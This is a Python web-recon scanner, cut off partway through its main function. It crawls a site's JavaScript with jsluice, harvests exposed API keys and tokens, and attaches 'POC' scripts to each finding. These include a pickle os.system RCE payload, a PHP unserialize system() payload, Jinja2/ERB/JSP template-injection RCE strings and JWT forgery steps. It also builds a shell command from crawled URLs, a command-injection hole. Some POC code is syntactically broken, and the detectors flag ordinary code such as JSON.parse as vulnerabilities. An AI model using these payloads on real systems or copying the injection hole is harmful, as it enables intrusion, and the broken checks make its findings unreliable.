import json
import sys
import urllib.parse
import argparse
from collections import OrderedDict
import asyncio
import aiohttp
import tempfile
import os
import re
import base64
import ipaddress
from urllib.parse import urlparse
import logging
import ssl
import socket
import jwt
import datetime
import requests

# Configure logging
logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')

# Cache to store fetched content
url_content_cache = {}
logger = logging.getLogger(__name__)

# Custom UserAgent
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"

# Semaphore for limiting concurrent connections
MAX_CONCURRENT_REQUESTS = 20
semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

def get_context(content: str, start: int, end: int, context_size: int = 50) -> str:
    """Get context around a specific part of the content."""
    context_start = max(0, start - context_size)
    context_end = min(len(content), end + context_size)
    return content[context_start:context_end]

def normalize_url(url: str, base_url: str) -> str:
    """Normalize a URL relative to a base URL."""
    if url.startswith('//'):
        return 'https:' + url
    elif not url.startswith(('http://', 'https://')):
        return urllib.parse.urljoin(base_url, url)
    return url

def is_js_file(url: str) -> bool:
    """Check if a URL points to a JavaScript file."""
    return url.lower().endswith('.js')

async def fetch_url_content(url: str, session: aiohttp.ClientSession) -> str:
    logger.debug(f"Attempting to fetch content from {url}")
    try:
        async with semaphore:
            async with session.get(url, timeout=30, headers={"User-Agent": USER_AGENT}) as response:
                if response.status != 200:
                    logger.warning(f"Failed to fetch {url}: HTTP {response.status}")
                    return ""
                content = await response.text()
                logger.info(f"Fetched: {url}")
                logger.debug(f"Content length: {len(content)}")
                return content
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.error(f"Network error for {url}: {str(e)}")
    except Exception as e:
        logger.exception(f"Unexpected error fetching {url}: {str(e)}")
    return ""


async def run_jsluice(url: str, mode: str, session: aiohttp.ClientSession, verbose: bool) -> tuple[list[str], str]:
    logger.debug(f"Running JSluice on {url} with mode {mode}")
    
    # Fetch content if not in cache
    if url not in url_content_cache:
        content = await fetch_url_content(url, session)
        if content:
            url_content_cache[url] = content
        else:
            logger.warning(f"No content fetched for {url}")
            return [], ""
    
    content = url_content_cache[url]


    # Create a new coroutine for each call
    async def run_jsluice_process():
        try:
            with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp_file:
                temp_file.write(content)
                temp_file_path = temp_file.name

            cmd = f"jsluice {mode} -R '{url}' {temp_file_path}"
            logger.debug(f"Running command: {cmd}")
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()

            os.unlink(temp_file_path)  # Remove the temporary file

            if stderr:
                logger.error(f"Error processing {url}: {stderr.decode()}")
            
            output = stdout.decode().splitlines()
            logger.debug(f"JSluice output lines: {len(output)}")
            return output, content
        except Exception as e:
            logger.exception(f"Unexpected error in run_jsluice for {url}: {str(e)}")
        return [], content

    return await run_jsluice_process()

async def process_jsluice_output(jsluice_output: list[str], current_url: str, content: str, verbose: bool) -> tuple[set[str], set[str], list[dict]]:
    js_urls = set()
    non_js_urls = set()
    secrets = []

    if verbose:
        logger.debug(f"Processing output for {current_url}")
        logger.debug(f"JSluice output lines: {len(jsluice_output)}")

    for line in jsluice_output:
        try:
            data = json.loads(line)
            if 'url' in data:
                url = normalize_url(data['url'], current_url)
                parsed_url = urllib.parse.urlparse(url)
                if parsed_url.scheme and parsed_url.netloc:
                    new_url = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        parsed_url.query,
                        parsed_url.fragment
                    ))
                    (js_urls if is_js_file(new_url) else non_js_urls).add(new_url)
            elif 'kind' in data:
                data['original_file'] = current_url
                secrets.append(data)
        except json.JSONDecodeError:
            if verbose:
                logger.warning(f"Error decoding JSON: {line}")

    if verbose:
        logger.debug(f"Found {len(js_urls)} JavaScript URLs")
        logger.debug(f"Found {len(non_js_urls)} non-JavaScript URLs")
        logger.debug(f"Found {len(secrets)} secrets from JSluice")

    # Add custom checks
    custom_checks = [
        check_aws_cognito, check_razorpay, check_mapbox, check_fcm,
        check_digitalocean, check_tugboat, check_internal_ips,
        check_graphql_introspection, check_jwt_none_algorithm,
        check_cors_misconfig
    ]
    
    for check in custom_checks:
        secrets.extend(check(content, current_url))

    if verbose:
        logger.debug(f"Total secrets after custom checks: {len(secrets)}")

    return js_urls, non_js_urls, secrets

def check_internal_ips(content, current_url):
    secrets = []
    ip_regex = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
    ip_matches = re.finditer(ip_regex, content)
    for match in ip_matches:
        ip = match.group()
        context = get_context(content, match.start(), match.end())
        
        # Check if the IP is not part of a version number or other common patterns
        if not re.search(r'\d+\.\d+\.\d+\.\d+[-\w]', context):
            try:
                ip_obj = ipaddress.ip_address(ip)
                # Exclude 0.0.0.0 and 0.0.0.1
                if ip_obj.is_private and ip not in ['0.0.0.0', '0.0.0.1']:
                    # Additional check for potentially valid internal IP ranges
                    if (ip_obj.is_private and
                        not ip_obj.is_loopback and
                        not ip_obj.is_link_local and
                        not ip_obj.is_multicast):
                        
                        # Check surrounding context for keywords that might indicate an internal IP
                        internal_keywords = ['internal', 'private', 'local', 'network', 'intranet', 'vpn']
                        if any(keyword in context.lower() for keyword in internal_keywords):
                            poc = f"curl -I {current_url}"
                            secrets.append({
                                'kind': 'InternalIPAddress',
                                'data': {'value': ip, 'matched_string': match.group()},
                                'filename': current_url,
                                'severity': 'medium',
                                'context': context,
                                'poc': poc,
                                'description': f"Potential internal IP address {ip} found in {current_url}. This may reveal information about the internal network structure."
                            })
            except ValueError:
                pass
    return secrets

def check_graphql_introspection(content, current_url):
    secrets = []
    graphql_markers = [
        '__schema', 'queryType', 'mutationType', 'subscriptionType',
        'types', 'inputFields', 'interfaces', 'enumValues', 'possibleTypes'
    ]
    if all(marker in content for marker in graphql_markers):
        context = get_context(content, content.index('__schema'), content.index('__schema') + 10)
        introspection_query = '''{
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}'''
        poc = f'''
curl -X POST {current_url} \\
-H "Content-Type: application/json" \\
-d '{{"query": "{introspection_query.replace('"', '\\"').replace("\n", "\\n")}"}}' 
'''
        secrets.append({
            'kind': 'GraphQLIntrospection',
            'data': {'value': 'GraphQL Introspection detected', 'matched_string': '__schema'},
            'filename': current_url,
            'severity': 'medium',
            'context': context,
            'poc': poc,
            'description': f"GraphQL introspection seems to be enabled on {current_url}. This could expose the entire API structure."
        })
    return secrets

def check_jwt_none_algorithm(content, current_url):
    secrets = []
    jwt_none_regex = r'alg\s*:\s*["\']?none["\']?'
    jwt_none_matches = re.finditer(jwt_none_regex, content, re.IGNORECASE)
    for match in jwt_none_matches:
        context = get_context(content, match.start(), match.end())
        poc = f'''
# Python script to generate a JWT token with 'none' algorithm
import jwt

payload = {{"user_id": 1, "username": "admin"}}
token = jwt.encode(payload, None, algorithm="none")
print(f"Generated token: {{token}}")

# Use this token in a curl command
curl -H "Authorization: Bearer {{token}}" {current_url}
'''
        secrets.append({
            'kind': 'JWTNoneAlgorithm',
            'data': {'value': 'JWT None Algorithm detected', 'matched_string': match.group()},
            'filename': current_url,
            'severity': 'high',
            'context': context,
            'poc': poc,
            'description': f"JWT 'none' algorithm usage detected in {current_url}. This is a severe security vulnerability allowing token forgery."
        })
    return secrets

def check_cors_misconfig(content, current_url):
    secrets = []
    cors_regex = r'Access-Control-Allow-Origin\s*:\s*\*'
    cors_matches = re.finditer(cors_regex, content, re.IGNORECASE)
    for match in cors_matches:
        context = get_context(content, match.start(), match.end())
        poc = f'''
# CORS Misconfiguration POC
# Run this Python script to verify the CORS misconfiguration

import requests

url = "{current_url}"
headers = {{"Origin": "https://attacker.com"}}

response = requests.options(url, headers=headers)
print(f"Response headers: {{response.headers}}")

if "Access-Control-Allow-Origin" in response.headers:
    if response.headers["Access-Control-Allow-Origin"] == "*" or response.headers["Access-Control-Allow-Origin"] == "https://attacker.com":
        print("CORS Misconfiguration Confirmed!")
    else:
        print("CORS seems to be properly configured.")
else:
    print("No CORS headers found.")

# Curl command for manual verification:
# curl -H "Origin: https://attacker.com" -I {current_url}
'''
        secrets.append({
            'kind': 'CORSMisconfiguration',
            'data': {'value': 'CORS Misconfiguration detected', 'matched_string': match.group()},
            'filename': current_url,
            'severity': 'medium',
            'context': context,
            'poc': poc,
            'description': f"Overly permissive CORS policy detected in {current_url}. This may allow unintended cross-origin requests. Please verify using the provided POC script."
        })
    return secrets

def verify_cors_misconfig(url):
    try:
        headers = {'Origin': 'https://attacker.com'}
        response = requests.options(url, headers=headers, timeout=5)
        if 'Access-Control-Allow-Origin' in response.headers:
            if response.headers['Access-Control-Allow-Origin'] == '*' or response.headers['Access-Control-Allow-Origin'] == 'https://attacker.com':
                return True, response.headers
    except Exception as e:
        return False, str(e)
    return False, None

def check_subdomain_takeover(url):
    try:
        parsed_url = urlparse(url)
        ip = socket.gethostbyname(parsed_url.netloc)
        if ip in ['127.0.0.1', '0.0.0.0']:
            poc = f'''
# Subdomain Takeover POC
# Run this Python script to verify the potential subdomain takeover

import socket
from urllib.parse import urlparse

url = "{url}"
parsed_url = urlparse(url)

try:
    ip = socket.gethostbyname(parsed_url.netloc)
    print(f"Resolved IP: {{ip}}")
    if ip in ['127.0.0.1', '0.0.0.0']:
        print("Potential Subdomain Takeover Detected!")
        print(f"The domain {{parsed_url.netloc}} resolves to {{ip}}, which may indicate a subdomain takeover vulnerability.")
    else:
        print("The domain resolves to a different IP. Further investigation may be needed.")
except socket.gaierror:
    print(f"Unable to resolve {{parsed_url.netloc}}. This could also indicate a potential subdomain takeover.")

# Additional manual checks:
# 1. Check if the domain is pointing to a non-existent resource on a cloud service (e.g., GitHub Pages, Heroku, etc.)
# 2. Look for error messages that indicate the resource doesn't exist
# 3. Try to claim the subdomain on the respective platform if possible
'''
            return {
                'kind': 'PotentialSubdomainTakeover',
                'data': {'value': url, 'ip': ip},
                'filename': url,
                'severity': 'high',
                'poc': poc,
                'description': f"Potential subdomain takeover vulnerability detected for {url}. IP resolves to {ip}. Please verify using the provided POC script."
            }
    except socket.gaierror:
        poc = f'''
# Subdomain Takeover POC
# Run this Python script to verify the potential subdomain takeover

import socket
from urllib.parse import urlparse

url = "{url}"
parsed_url = urlparse(url)

try:
    ip = socket.gethostbyname(parsed_url.netloc)
    print(f"Resolved IP: {{ip}}")
    print("The domain resolves. This might not be a subdomain takeover.")
except socket.gaierror:
    print(f"Unable to resolve {{parsed_url.netloc}}. This could indicate a potential subdomain takeover.")

# Additional manual checks:
# 1. Check if the domain is pointing to a non-existent resource on a cloud service (e.g., GitHub Pages, Heroku, etc.)
# 2. Look for error messages that indicate the resource doesn't exist
# 3. Try to claim the subdomain on the respective platform if possible
'''
        return {
            'kind': 'PotentialSubdomainTakeover',
            'data': {'value': url},
            'filename': url,
            'severity': 'high',
            'poc': poc,
            'description': f"Potential subdomain takeover vulnerability detected for {url}. Domain does not resolve. Please verify using the provided POC script."
        }
    return None

def check_ssl_misconfigurations(url):
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as secure_sock:
                cert = secure_sock.getpeercert()
                
                # Check for weak cipher suites
                ciphers = secure_sock.cipher()
                if ciphers[0] in ['TLS_RSA_WITH_RC4_128_SHA', 'TLS_RSA_WITH_RC4_128_MD5']:
                    poc = f'''
# Weak SSL Cipher POC
# Run this Python script to verify the weak SSL cipher

import ssl
import socket
from urllib.parse import urlparse

url = "{url}"
parsed_url = urlparse(url)
hostname = parsed_url.netloc

context = ssl.create_default_context()
with socket.create_connection((hostname, 443)) as sock:
    with context.wrap_socket(sock, server_hostname=hostname) as secure_sock:
        cipher = secure_sock.cipher()
        print(f"Cipher suite in use: {{cipher[0]}}")
        if cipher[0] in ['TLS_RSA_WITH_RC4_128_SHA', 'TLS_RSA_WITH_RC4_128_MD5']:
            print("Weak cipher detected!")
        else:
            print("Cipher seems to be secure.")

# You can also use OpenSSL to check supported ciphers:
# openssl s_client -connect {hostname}:443 -cipher 'RC4'
'''
                    return {
                        'kind': 'WeakSSLCipher',
                        'data': {'value': ciphers[0]},
                        'filename': url,
                        'severity': 'high',
                        'poc': poc,
                        'description': f"Weak SSL cipher suite detected: {ciphers[0]}. Please verify using the provided POC script."
                    }
                
                # Check for expired certificates
                exp_date = datetime.datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
                if exp_date < datetime.datetime.now():
                    poc = f'''
# Expired SSL Certificate POC
# Run this Python script to verify the expired SSL certificate

import ssl
import socket
from urllib.parse import urlparse
import datetime

url = "{url}"
parsed_url = urlparse(url)
hostname = parsed_url.netloc

context = ssl.create_default_context()
with socket.create_connection((hostname, 443)) as sock:
    with context.wrap_socket(sock, server_hostname=hostname) as secure_sock:
        cert = secure_sock.getpeercert()
        exp_date = datetime.datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
        print(f"Certificate expiration date: {{exp_date}}")
        if exp_date < datetime.datetime.now():
            print("Certificate has expired!")
        else:
            print("Certificate is still valid.")

# You can also use OpenSSL to check the certificate:
# openssl s_client -connect {hostname}:443 -servername {hostname} | openssl x509 -noout -dates
'''
                    return {
                        'kind': 'ExpiredSSLCertificate',
                        'data': {'value': cert['notAfter']},
                        'filename': url,
                        'severity': 'high',
                        'poc': poc,
                        'description': f"SSL certificate expired on {cert['notAfter']}. Please verify using the provided POC script."
                    }
                
    except Exception as e:
        return {
            'kind': 'SSLError',
            'data': {'value': str(e)},
            'filename': url,
            'severity': 'medium',
            'description': f"Error occurred while checking SSL: {str(e)}. Manual verification is recommended."
        }
    return None

def check_jwt_key_confusion(content, current_url):
    jwt_regex = r'eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]+'
    jwt_matches = re.finditer(jwt_regex, content)
    for match in jwt_matches:
        token = match.group()
        try:
            header = jwt.get_unverified_header(token)
            if 'alg' in header and header['alg'] == 'HS256':
                # Try to verify with a common public key
                public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo\n4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u\n+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh\nkd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ\n0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg\ncKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc\nmwIDAQAB\n-----END PUBLIC KEY-----"
                try:
                    jwt.decode(token, public_key, algorithms=['HS256'])
                    poc = f'''
# JWT Key Confusion Vulnerability POC
# Run this Python script to verify the JWT key confusion vulnerability

import jwt

token = "{token}"
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo
4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u
+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh
kd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ
0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg
cKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc
mwIDAQAB
-----END PUBLIC KEY-----"""

try:
    decoded = jwt.decode(token, public_key, algorithms=['HS256'])
    print("JWT Key Confusion Vulnerability Confirmed!")
    print(f"Decoded token: {{decoded}}")
except jwt.exceptions.InvalidSignatureError:
    print("Token signature is invalid. No vulnerability detected.")
except Exception as e:
    print(f"An error occurred: {{e}}")

# To exploit this vulnerability:
# 1. Create a new token with the same header and payload
# 2. Sign it using the public key as the secret
# 3. Use this token to gain unauthorized access

# Example:
# new_token = jwt.encode(decoded, public_key, algorithm='HS256')
# print(f"New forged token: {{new_token}}")
'''
                    return {
                        'kind': 'JWTKeyConfusionVulnerability',
                        'data': {'value': token[:20] + '...'},
                        'filename': current_url,
                        'severity': 'critical',
                        'poc': poc,
                        'description': "Potential JWT key confusion vulnerability. The token uses HS256 algorithm and can be verified with a common public key. Please verify using the provided POC script."
                    }
                except:
                    pass
        except:
            pass
    return None

def check_prototype_pollution(content, current_url):
    pollution_patterns = [
        r'Object\.assign\s*\(\s*{}\s*,',
        r'Object\.prototype\.__proto__',
        r'__proto__\s*[=:]',
        r'prototype\s*[=:]'
    ]
    
    for pattern in pollution_patterns:
        matches = re.finditer(pattern, content)
        for match in matches:
            context = get_context(content, match.start(), match.end())
            poc = f'''
# Prototype Pollution Vulnerability POC
# This is a conceptual POC. Actual exploitation depends on the specific implementation.

# Assume we have a vulnerable function like this:
def merge(target, source):
    for key in source:
        if isinstance(source[key], dict):
            target[key] = merge(target.get(key, {{}}, source[key])
        else:
            target[key] = source[key]
    return target

# Exploitation:
malicious_payload = {{"__proto__": {{"polluted": "Yes, I am polluted!"}}}}

# Merge the malicious payload
merge({{}}, malicious_payload)

# Now, any object should have the 'polluted' property
obj = {{}}
print(obj.polluted)  # Should print: "Yes, I am polluted!"

# To test this on the target application:
# 1. Identify input fields or API endpoints that accept JSON data
# 2. Try to inject the malicious payload
# 3. Check if global Object prototype has been polluted

# Example for API testing:
import requests

url = "{current_url}"
payload = {{"__proto__": {{"polluted": "Yes, I am polluted!"}}}}

response = requests.post(url, json=payload)
print(response.text)  # Check the response for signs of successful pollution

# After sending the payload, try to access the 'polluted' property on different objects in the application
'''
            return {
                'kind': 'PotentialPrototypePollution',
                'data': {'value': match.group(), 'context': context},
                'filename': current_url,
                'severity': 'high',
                'poc': poc,
                'description': f"Potential prototype pollution vulnerability detected in {current_url}. This could lead to object property manipulation and potential RCE. Please verify using the provided POC script."
            }
    return None

def check_deserialization_vulnerabilities(content, current_url):
    deser_patterns = [
        r'JSON\.parse\s*\(',
        r'eval\s*\(',
        r'unserialize\s*\(',
        r'deserialize\s*\('
    ]
    
    for pattern in deser_patterns:
        matches = re.finditer(pattern, content)
        for match in matches:
            context = get_context(content, match.start(), match.end())
            poc = f'''
# Deserialization Vulnerability POC
# This is a conceptual POC. Actual exploitation depends on the specific implementation and language.

# For JavaScript (JSON.parse and eval):
malicious_payload = '{{"__proto__": {{"polluted": true}}}}'

# Try to find an endpoint that accepts this payload and uses JSON.parse or eval
# Example:
import requests

url = "{current_url}"
headers = {{"Content-Type": "application/json"}}
response = requests.post(url, data=malicious_payload, headers=headers)
print(response.text)

# For PHP (unserialize):
# Assuming a vulnerable PHP code like this:
# $data = unserialize($_GET['data']);

# Malicious payload (replace CLASS_NAME with an existing class name in the application):
# O:11:"CLASS_NAME":1:{{s:10:"malicious";s:36:"system('id; uname -a; ls -la; pwd;');"}}

# URL encode the payload and send it to the vulnerable endpoint:
# {current_url}?data=O%3A11%3A%22CLASS_NAME%22%3A1%3A%7Bs%3A10%3A%22malicious%22%3Bs%3A36%3A%22system%28%27id%3B+uname+-a%3B+ls+-la%3B+pwd%3B%27%29%3B%22%7D

# For Python (pickle):
# Assuming a vulnerable Python code like this:
# data = pickle.loads(request.GET.get('data'))

import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id; uname -a; ls -la; pwd;',))

# Serialize the malicious object
serialized = pickle.dumps(RCE())
encoded = base64.b64encode(serialized).decode()

# Send this to the vulnerable endpoint:
# {current_url}?data=<encoded_payload>

print(f"Encoded payload: {{encoded}}")

# Remember to always validate and sanitize user input before deserialization!
'''
            return {
                'kind': 'PotentialDeserializationVulnerability',
                'data': {'value': match.group(), 'context': context},
                'filename': current_url,
                'severity': 'high',
                'poc': poc,
                'description': f"Potential deserialization vulnerability detected in {current_url}. This could lead to remote code execution if user input is not properly sanitized. Please verify using the provided POC script."
            }
    return None

def check_server_side_template_injection(content, current_url):
    ssti_patterns = [
        r'\{\{\s*.*\s*\}\}',  # Jinja2/Twig
        r'\$\{.*\}',  # JSP/JSF
        r'<\%.*\%>',  # ASP/JSP
        r'\#\{.*\}'   # Ruby ERB
    ]
    
    for pattern in ssti_patterns:
        matches = re.finditer(pattern, content)
        for match in matches:
            context = get_context(content, match.start(), match.end())
            poc = f'''
# Server-Side Template Injection (SSTI) Vulnerability POC
# This is a conceptual POC. Actual payloads depend on the template engine in use.

import requests

url = "{current_url}"

# Test payloads for different template engines
payloads = [
    '{{7*7}}',  # Jinja2, Twig
    '${{7*7}}',  # JSP, JSF
    '<%= 7*7 %>',  # ERB, ASP
    '#{{7*7}}',  # Ruby ERB
    '${{{7*7}}}',  # JSP
    '{{7*'+'7}}',  # Bypass some filters
    '{{config}}',  # Jinja2 config object
    '{{self.__init__.__globals__.__builtins__}}',  # Python builtins in Jinja2
]

for payload in payloads:
    print(f"Testing payload: {{payload}}")
    response = requests.get(url, params={{"input": payload}})
    print(f"Response: {{response.text}}")
    print("---")

# If any of these payloads return '49' or expose sensitive information,
# it likely indicates a SSTI vulnerability.

# For more advanced exploitation:
# Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# ERB: <%= `id` %>
# JSP: ${{Runtime.getRuntime().exec("id")}}

# Remember to always validate and sanitize user input in templates!
'''
            return {
                'kind': 'PotentialServerSideTemplateInjection',
                'data': {'value': match.group(), 'context': context},
                'filename': current_url,
                'severity': 'high',
                'poc': poc,
                'description': f"Potential server-side template injection vulnerability detected in {current_url}. This could lead to remote code execution if user input is not properly sanitized. Please verify using the provided POC script."
            }
    return None

def check_aws_cognito(content, current_url):
    secrets = []
    cognito_markers = [
        'identityPoolId', 'cognitoIdentityPoolId', 'userPoolWebClientId', 'userPoolId',
        'aws_user_pools_id', 'aws_cognito_identity_pool_id', 'AWSCognitoIdentityProviderService',
        'CognitoIdentityCredentials', 'AWS.CognitoIdentityServiceProvider', 'cognitoUser'
    ]

    for marker in cognito_markers:
        matches = re.finditer(rf'{marker}\s*[=:]\s*["\']?([^"\']+)["\']?', content)
        for match in matches:
            context = get_context(content, match.start(), match.end())
            secrets.append({
                'kind': 'AWSCognitoConfiguration',
                'data': {'marker': marker, 'value': match.group(1), 'matched_string': match.group()},
                'filename': current_url,
                'severity': 'info',
                'context': context
            })

    pool_id_regex = r'(us|ap|ca|cn|eu|sa)-[a-z]+-\d:[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
    pool_ids = re.finditer(pool_id_regex, content)
    for match in pool_ids:
        context = get_context(content, match.start(), match.end())
        secrets.append({
            'kind': 'AWSCognitoPoolID',
            'data': {'value': match.group(), 'matched_string': match.group()},
            'filename': current_url,
            'severity': 'medium',
            'context': context
        })

    partial_pool_id_regex = r'(us|ap|ca|cn|eu|sa)-[a-z]+-\d[:\w-]{10,}'
    partial_pool_ids = re.finditer(partial_pool_id_regex, content)
    for match in partial_pool_ids:
        if match.group() not in [s['data']['value'] for s in secrets if s['kind'] == 'AWSCognitoPoolID']:
            context = get_context(content, match.start(), match.end())
            secrets.append({
                'kind': 'PossibleAWSCognitoPoolID',
                'data': {'value': match.group(), 'matched_string': match.group()},
                'filename': current_url,
                'severity': 'low',
                'context': context
            })

    # Check for potential Cognito tokens
    token_regex = r'eyJraWQiOiJ[\w-]+\.[\w-]+\.[\w-]+'
    token_matches = re.finditer(token_regex, content)
    for match in token_matches:
        token = match.group()
        token_type = validate_cognito_token(token)
        if token_type:
            context = get_context(content, match.start(), match.end())
            secrets.append({
                'kind': f'AWSCognito{token_type}Token',
                'data': {'value': token[:20] + '...', 'matched_string': match.group()},
                'filename': current_url,
                'severity': 'high' if token_type == 'Authenticated' else 'medium',
                'context': context
            })

    return secrets

def validate_cognito_token(token):
    try:
        # Decode the token without verification
        header = json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))

        # Check if it's a Cognito token
        if 'cognito:groups' in payload or 'token_use' in payload:
            if 'cognito:username' in payload or payload.get('token_use') == 'access':
                return 'Authenticated'
            else:
                return 'Anonymous'
    except:
        pass
    return None

def check_razorpay(content, current_url):
    secrets = []
    razorpay_regex = r"(rzp_(live|test)_[a-zA-Z0-9]{14})"
    razorpay_matches = re.finditer(razorpay_regex, content)
    for match in razorpay_matches:
        secrets.append({
            'kind': 'RazorpayClientID',
            'data': {'value': match.group(1), 'matched_string': match.group()},
            'filename': current_url,
            'severity': 'high',
            'context': None
        })
    return secrets

def check_mapbox(content, current_url):
    secrets = []
    mapbox_regex = r'(sk\.eyJ1Ijoi\w+\.[\w-]*)'
    mapbox_matches = re.finditer(mapbox_regex, content)
    for match in mapbox_matches:
        secrets.append({
            'kind': 'MapboxToken',
            'data': {'value': match.group(1), 'matched_string': match.group()},
            'filename': current_url,
            'severity': 'medium',
            'context': None
        })
    return secrets

def check_fcm(content, current_url):
    secrets = []
    fcm_regex = r"(AAAA[a-zA-Z0-9_-]{7}:[a-zA-Z0-9_-]{140})"
    fcm_matches = re.finditer(fcm_regex, content)
    for match in fcm_matches:
        secrets.append({
            'kind': 'FCMServerKey',
            'data': {'value': match.group(1), 'matched_string': match.group()},
            'filename': current_url,
            'severity': 'high',
            'context': None
        })
    return secrets

def check_digitalocean(content, current_url):
    secrets = []
    do_key_regex = r'"do_key"\s*:\s*"([^"]+)"'
    do_key_matches = re.finditer(do_key_regex, content)
    for match in do_key_matches:
        secrets.append({
            'kind': 'DigitalOceanKey',
            'data': {'value': match.group(1), 'matched_string': match.group()},
            'filename': current_url,
            'severity': 'critical',
            'context': None
        })
    return secrets

def check_tugboat(content, current_url):
    secrets = []
    
    # Check if all required words are present
    required_words = ["authentication", "access_token", "ssh_user"]
    if all(word in content for word in required_words):
        # Use the specific regex pattern from the YAML
        tugboat_regex = r'access_token:\s*(.*)'
        tugboat_matches = re.findall(tugboat_regex, content)
        
        for match in tugboat_matches:
            secrets.append({
                'kind': 'TugboatConfig',
                'data': {
                    'value': match,
                    'matched_string': f'access_token: {match}'
                },
                'filename': current_url,
                'severity': 'critical',
                'context': None
            })
    
    return secrets

async def recursive_process(initial_url, session, processed_urls, verbose, loop):
    logger.debug(f"Starting recursive process for {initial_url}")
    if initial_url in processed_urls:
        logger.debug(f"URL {initial_url} already processed, skipping")
        return set(), set(), []
    processed_urls.add(initial_url)

    urls_output, content = await run_jsluice(initial_url, 'urls', session, verbose)
    secrets_output, _ = await run_jsluice(initial_url, 'secrets', session, verbose)

    js_urls, non_js_urls, secrets = await process_jsluice_output(urls_output + secrets_output, initial_url, content, verbose)
    logger.debug(f"Found {len(js_urls)} JS URLs, {len(non_js_urls)} non-JS URLs, and {len(secrets)} secrets for {initial_url}")

    # Add new advanced checks
    advanced_checks = [
        (check_subdomain_takeover, "Potential subdomain takeover"),
        (check_ssl_misconfigurations, "SSL misconfiguration"),
        (lambda url: check_jwt_key_confusion(content, url), "JWT key confusion vulnerability"),
        (lambda url: check_prototype_pollution(content, url), "Potential prototype pollution"),
        (lambda url: check_deserialization_vulnerabilities(content, url), "Potential deserialization vulnerability"),
        (lambda url: check_server_side_template_injection(content, url), "Potential SSTI vulnerability")
    ]

    for check_func, log_message in advanced_checks:
        result = await loop.run_in_executor(None, check_func, initial_url)
        if result:
            secrets.append(result)
            logger.debug(f"{log_message} detected for {initial_url}")

    all_js_urls = set(js_urls)
    all_non_js_urls = set(non_js_urls)
    all_secrets = list(secrets)

    for url in js_urls:
        if url not in processed_urls:
            result_js_urls, result_non_js_urls, result_secrets = await recursive_process(url, session, processed_urls, verbose, loop)
            all_js_urls.update(result_js_urls)
            all_non_js_urls.update(result_non_js_urls)
            all_secrets.extend(result_secrets)

    logger.debug(f"Completed recursive process for {initial_url}")
    return all_js_urls, all_non_js_urls, all_secrets

def severity_to_int(severity):
    severity_map = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'info': 0}
    return severity_map.get(severity.lower(), -1)

async def main():
    parser = argparse.ArgumentParser(description="JSluice URL and Secrets Processor")
